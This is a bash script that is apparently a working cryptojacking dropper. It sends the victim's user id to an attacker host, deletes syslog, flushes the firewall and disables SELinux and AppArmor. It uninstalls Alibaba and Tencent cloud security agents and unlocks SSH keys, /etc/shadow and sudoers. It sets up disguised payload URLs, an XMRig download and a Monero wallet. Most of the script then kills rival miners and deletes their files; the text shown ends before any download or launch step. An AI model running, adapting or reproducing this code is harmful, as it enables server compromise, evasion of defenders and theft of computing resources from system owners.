#!/bin/bash
us=$(id)
curl "http://oracle.zzhreceive.top/b2f628/idcheck/$us" >>/dev/null
ulimit -n 65535
export MOHOME=/usr/share
mkdir $MOHOME -p
if [ -f "$MOHOME/[crypto].log" ]
then
    echo "process possible running"
    current=$(date +%s)
    last_modified=$(stat -c "%Y" $MOHOME/[crypto].log)
   if [ $(($current-$last_modified)) -gt 600 ]; then
        echo "no miner process running";
    else
    echo "miner process running"
    exit 1
   fi
else 
    echo "miner process not running"
fi
rm -rf /var/log/syslog
chattr -iua /tmp/
chattr -iua /var/tmp/
ufw disable
iptables -F
sudo sysctl kernel.nmi_watchdog=0
sysctl kernel.nmi_watchdog=0
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
chattr -iae /root/.ssh/
chattr -iae /root/.ssh/authorized_keys
rm -rf /tmp/addres*
rm -rf /tmp/walle*
rm -rf /tmp/keys
if ps aux | grep -i '[a]liyun'; then
  curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
  curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then
  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop && /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove && rm -rf /usr/local/cloudmonitor	
else
  export ARCH=amd64
  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} ]; then
    /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} stop && /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} uninstall && rm -rf /usr/local/cloudmonitor	
  else
    echo "ali cloud monitor not running"
  fi
fi
setenforce 0
echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis


MOxmrigMOD=http://210.35.193.88/static/unity/Build/mod.jpg
MOxmrigSTOCK=http://210.35.193.88/static/unity/Build/mod.jpg
miner_url=https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz
miner_url_backup=http://oracle.zzhreceive.top/b2f628/father.jpg
config_url=http://oracle.zzhreceive.top/b2f628/cf.jpg
config_url_backup=http://oracle.zzhreceive.top/b2f628/cf.jpg
WALLET=43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.pokemon7
VERSION=2.9


function FixTheSystem(){
echo "begin FixTheSystem"
tntrecht -i /bin/chmod || chattr -i /bin/chmod
setfacl -m u::x /bin/chmod
tntrecht -i /bin/chattr || chattr -i /bin/chattr
chmod +x /bin/chattr || setfacl -m u::x /bin/chattr

SYSFILEARRAY=(/usr/bin/apt  /usr/bin/apt-get /bin/yum  /bin/kill /usr/lib/klibc/bin/kill /usr/bin/pkill /bin/pkill /sbin/shutdown /sbin/reboot /sbin/poweroff /sbin/telinit)
for SYSFILEBIN in ${SYSFILEARRAY[@]}; do
tntrecht -i $SYSFILEBIN 
chattr -i $SYSFILEBIN 
setfacl -m u::x /bin/chmod 
setfacl -m u::x $SYSFILEBIN
chmod +x $SYSFILEBIN 
chattr +i $SYSFILEBIN 
tntrecht +i $SYSFILEBIN 
done


SYSTEMFILEARRAY=("/root/.ssh/" "/home/*/.ssh/" "/etc/passwd" "/etc/shadow" "/etc/sudoers" "/etc/ssh/" "/etc/ssh/sshd_config")
for SYSTEMFILE in ${SYSTEMFILEARRAY[@]}; do
tntrecht -iR $SYSTEMFILE  2>/dev/null 1>/dev/null
chattr -iR $SYSTEMFILE  2>/dev/null 1>/dev/null
done

setfacl -m u::x /bin/chmod

}


kill_miner_proc()
{
netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'I0r8Jyyt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AgdgACUD' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'uiZvwxG8' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'BtwXn5qH' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '3XEzey2T' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 't2tKrCSZ' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'svc' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'HD7fcBgg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'zXcDajSs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '3lmigMo' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AkMK4A2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AJ2AkKe' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'HiPxCJRS' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC030' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC031' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC032' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC033' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "C4iLM4L" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rkebbwgqpl4npmm" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "0kwti6ut420t" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "158.69.133.18:8220" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "kieuanilam.me" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
pgrep -f xzpauectgr | xargs -I % kill -9 %
pgrep -f slxfbkmxtd | xargs -I % kill -9 %
pgrep -f mixtape | xargs -I % kill -9 %
pgrep -f addnj | xargs -I % kill -9 %
pgrep -f 200.68.17.196 | xargs -I % kill -9 %
pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % kill -9 %
pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % kill -9 %
pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % kill -9 %
pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % kill -9 %
pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
pgrep -f mqdsflm.cf | xargs -I % kill -9 %
pgrep -f lower.sh | xargs -I % kill -9 %
pgrep -f ./ppp | xargs -I % kill -9 %
pgrep -f cryptonight | xargs -I % kill -9 %
pgrep -f ./seervceaess | xargs -I % kill -9 %
pgrep -f ./servceaess | xargs -I % kill -9 %
pgrep -f ./servceas | xargs -I % kill -9 %
pgrep -f ./servcesa | xargs -I % kill -9 %
pgrep -f ./vsp | xargs -I % kill -9 %
pgrep -f ./jvs | xargs -I % kill -9 %
pgrep -f ./pvv | xargs -I % kill -9 %
pgrep -f ./vpp | xargs -I % kill -9 %
pgrep -f ./pces | xargs -I % kill -9 %
pgrep -f ./rspce | xargs -I % kill -9 %
pgrep -f ./haveged | xargs -I % kill -9 %
pgrep -f ./jiba | xargs -I % kill -9 %
pgrep -f ./watchbog | xargs -I % kill -9 %
pgrep -f ./A7mA5gb | xargs -I % kill -9 %
pgrep -f kacpi_svc | xargs -I % kill -9 %
pgrep -f kswap_svc | xargs -I % kill -9 %
pgrep -f kauditd_svc | xargs -I % kill -9 %
pgrep -f kpsmoused_svc | xargs -I % kill -9 %
pgrep -f kseriod_svc | xargs -I % kill -9 %
pgrep -f kthreadd_svc | xargs -I % kill -9 %
pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
pgrep -f kintegrityd_svc | xargs -I % kill -9 %
pgrep -f jawa | xargs -I % kill -9 %
pgrep -f oracle.jpg | xargs -I % kill -9 %
pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % kill -9 %
pgrep -f 188.209.49.54 | xargs -I % kill -9 %
pgrep -f 181.214.87.241 | xargs -I % kill -9 %
pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % kill -9 %
pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % kill -9 %
pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % kill -9 %
pgrep -f servim | xargs -I % kill -9 %
pgrep -f kblockd_svc | xargs -I % kill -9 %
pgrep -f native_svc | xargs -I % kill -9 %
pgrep -f ynn | xargs -I % kill -9 %
pgrep -f 65ccEJ7 | xargs -I % kill -9 %
pgrep -f jmxx | xargs -I % kill -9 %
pgrep -f 2Ne80nA | xargs -I % kill -9 %
pgrep -f sysstats | xargs -I % kill -9 %
pgrep -f systemxlv | xargs -I % kill -9 %
pgrep -f watchbog | xargs -I % kill -9 %
pgrep -f OIcJi1m | xargs -I % kill -9 %
pkill -f biosetjenkins
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f XJnRj
pkill -f mgwsl
pkill -f pythno
pkill -f jweri
pkill -f lx26
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
pkill -f irqbalanc1
pkill -f minerd
pkill -f i586
pkill -f gddr
pkill -f mstxmr
pkill -f ddg.2011
pkill -f wnTKYg
pkill -f deamon
pkill -f disk_genius
pkill -f sourplum
pkill -f polkitd
pkill -f nanoWatch
pkill -f zigw
pkill -f devtool
pkill -f devtools
pkill -f systemctI
pkill -f watchbog
pkill -f cryptonight
pkill -f sustes
pkill -f xmrig
pkill -f xmrig-cpu
pkill -f 121.42.151.137
pkill -f init12.cfg
pkill -f nginxk
pkill -f tmp/wc.conf
pkill -f xmrig-notls
pkill -f xmr-stak
pkill -f suppoie
pkill -f zer0day.ru
pkill -f dbus-daemon--system
pkill -f nullcrew
pkill -f systemctI
pkill -f kworkerds
pkill -f init10.cfg
pkill -f /wl.conf
pkill -f crond64
pkill -f sustse
pkill -f vmlinuz
pkill -f exin
pkill -f apachiii
pkill -f svcworkmanager
pkill -f xr
pkill -f trace
pkill -f svcupdate
pkill -f networkmanager
pkill -f phpupdate
rm -rf /usr/bin/config.json
rm -rf /usr/bin/exin
rm -rf /tmp/wc.conf
rm -rf /tmp/log_rot
rm -rf /tmp/apachiii
rm -rf /tmp/sustse
rm -rf /tmp/php
rm -rf /tmp/p2.conf
rm -rf /tmp/pprt
rm -rf /tmp/ppol
rm -rf /tmp/javax/config.sh
rm -rf /tmp/javax/sshd2
rm -rf /tmp/.profile
rm -rf /tmp/1.so
rm -rf /tmp/kworkerds
rm -rf /tmp/kworkerds3
rm -rf /tmp/kworkerdssx
rm -rf /tmp/xd.json
rm -rf /tmp/syslogd
rm -rf /tmp/syslogdb
rm -rf /tmp/65ccEJ7
rm -rf /tmp/jmxx
rm -rf /tmp/2Ne80nA
rm -rf /tmp/dl
rm -rf /tmp/ddg
rm -rf /tmp/systemxlv
rm -rf /tmp/systemctI
rm -rf /tmp/.abc
rm -rf /tmp/osw.hb
rm -rf /tmp/.tmpleve
rm -rf /tmp/.tmpnewzz
rm -rf /tmp/.java
rm -rf /tmp/.omed
rm -rf /tmp/.tmpc
rm -rf /tmp/.tmpleve
rm -rf /tmp/.tmpnewzz
rm -rf /tmp/gates.lod
rm -rf /tmp/conf.n
rm -rf /tmp/devtool
rm -rf /tmp/devtools
rm -rf /tmp/fs
rm -rf /tmp/.rod
rm -rf /tmp/.rod.tgz
rm -rf /tmp/.rod.tgz.1
rm -rf /tmp/.rod.tgz.2
rm -rf /tmp/.mer
rm -rf /tmp/.mer.tgz
rm -rf /tmp/.mer.tgz.1
rm -rf /tmp/.hod
rm -rf /tmp/.hod.tgz
rm -rf /tmp/.hod.tgz.1
rm -rf /tmp/84Onmce
rm -rf /tmp/C4iLM4L
rm -rf /tmp/lilpip
rm -rf /tmp/3lmigMo
rm -rf /tmp/am8jmBP
rm -rf /tmp/tmp.txt
rm -rf /tmp/baby
rm -rf /tmp/.lib
rm -rf /tmp/systemd
rm -rf /tmp/lib.tar.gz
rm -rf /tmp/baby
rm -rf /tmp/java
rm -rf /tmp/j2.conf
rm -rf /tmp/.mynews1234
rm -rf /tmp/a3e12d
rm -rf /tmp/.pt
rm -rf /tmp/.pt.tgz
rm -rf /tmp/.pt.tgz.1
rm -rf /tmp/go
rm -rf /tmp/java
rm -rf /tmp/j2.conf
rm -rf /tmp/.tmpnewasss
rm -rf /tmp/java
rm -rf /tmp/go.sh
rm -rf /tmp/go2.sh
rm -rf /tmp/khugepageds
rm -rf /tmp/.censusqqqqqqqqq
rm -rf /tmp/.kerberods
rm -rf /tmp/kerberods
rm -rf /tmp/seasame
rm -rf /tmp/touch
rm -rf /tmp/.p
rm -rf /tmp/runtime2.sh
rm -rf /tmp/runtime.sh
rm -rf /dev/shm/z3.sh
rm -rf /dev/shm/z2.sh
rm -rf /dev/shm/.scr
rm -rf /dev/shm/.kerberods
rm -f /etc/ld.so.preload
rm -f /usr/local/lib/libioset.so
chattr -i /etc/ld.so.preload
rm -f /etc/ld.so.preload
rm -f /usr/local/lib/libioset.so
rm -rf /tmp/watchdogs
rm -rf /etc/cron.d/tomcat
rm -rf /etc/rc.d/init.d/watchdogs
rm -rf /usr/sbin/watchdogs
rm -f /tmp/kthrotlds
rm -f /etc/rc.d/init.d/kthrotlds
rm -rf /tmp/.sysbabyuuuuu12
rm -rf /tmp/logo9.jpg
rm -rf /tmp/miner.sh
rm -rf /tmp/nullcrew
rm -rf /tmp/proc
rm -rf /tmp/2.sh
rm /opt/atlassian/confluence/bin/1.sh
rm /opt/atlassian/confluence/bin/1.sh.1
rm /opt/atlassian/confluence/bin/1.sh.2
rm /opt/atlassian/confluence/bin/1.sh.3
rm /opt/atlassian/confluence/bin/3.sh
rm /opt/atlassian/confluence/bin/3.sh.1
rm /opt/atlassian/confluence/bin/3.sh.2
rm /opt/atlassian/confluence/bin/3.sh.3
rm -rf /var/tmp/f41
rm -rf /var/tmp/2.sh
rm -rf /var/tmp/config.json
rm -rf /var/tmp/xmrig
rm -rf /var/tmp/1.so
rm -rf /var/tmp/kworkerds3
rm -rf /var/tmp/kworkerdssx
rm -rf /var/tmp/kworkerds
rm -rf /var/tmp/wc.conf
rm -rf /var/tmp/nadezhda.
rm -rf /var/tmp/nadezhda.arm
rm -rf /var/tmp/nadezhda.arm.1
rm -rf /var/tmp/nadezhda.arm.2
rm -rf /var/tmp/nadezhda.x86_64
rm -rf /var/tmp/nadezhda.x86_64.1
rm -rf /var/tmp/nadezhda.x86_64.2
rm -rf /var/tmp/sustse3
rm -rf /var/tmp/sustse
rm -rf /var/tmp/moneroocean/
rm -rf /var/tmp/devtool
rm -rf /var/tmp/devtools
rm -rf /var/tmp/play.sh
rm -rf /var/tmp/systemctI
rm -rf /var/tmp/.java
rm -rf /var/tmp/1.sh
rm -rf /var/tmp/conf.n
rm -r /var/tmp/lib
rm -r /var/tmp/.lib
chattr -iau /tmp/lok
chmod +700 /tmp/lok
rm -rf /tmp/lok
sleep 1
chattr -i /tmp/kdevtmpfsi
echo 1 > /tmp/kdevtmpfsi
